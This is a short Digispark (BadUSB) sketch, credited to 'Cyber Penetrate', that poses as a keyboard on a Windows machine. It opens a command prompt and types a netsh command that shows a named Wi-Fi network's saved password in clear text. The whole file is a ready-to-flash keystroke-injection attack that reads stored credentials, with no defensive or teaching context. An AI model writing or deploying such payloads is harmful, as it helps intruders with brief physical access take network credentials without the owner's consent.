/*
 * Find Wifi Password
 * It show password of the particular wifi via CMD.
 * Author - Cyber Penetrate
*/
#include<DigiKeyboard.h>
void setup()
{
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("netsh wlan show profile name_of_wifi key=clear|findstr \"Key Content\"");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop()
{
  //Nothing to do here :)
}
